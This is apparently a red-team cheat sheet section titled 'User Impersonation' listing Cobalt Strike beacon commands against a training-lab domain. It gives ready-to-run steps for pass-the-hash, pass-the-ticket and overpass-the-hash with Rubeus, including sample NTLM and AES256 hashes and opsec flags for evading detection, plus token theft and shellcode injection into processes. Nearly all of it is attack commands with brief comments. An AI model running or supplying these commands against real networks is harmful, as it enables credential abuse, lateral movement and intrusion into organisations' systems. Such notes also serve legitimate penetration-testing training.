### User Impersonation

- Pass The Hash Attack

```powershell
beacon> getuid
beacon> ls \\web.dev.cyberbotic.io\c$

# PTH using inbuild method in CS (internally uses Mimikatz)
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

# Find Local Admin Access
beacon> powerpick Find-LocalAdminAccess

beacon> rev2self
```

- Pass The Ticket Attack

```powershell
# Create a sacrificial token with dummy credentials
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Inject the TGT ticket into logon session returned as output of previous command
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

# OR Combine above 2 steps in one
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 

beacon> steal_token 4748
```

- OverPass The Hash

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

# Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

- Token Impersonation & Proces Injection

```powershell
beacon> steal_token 4464
beacon> inject 4464 x64 tcp-local
beacon> shinject /path/to/binary
```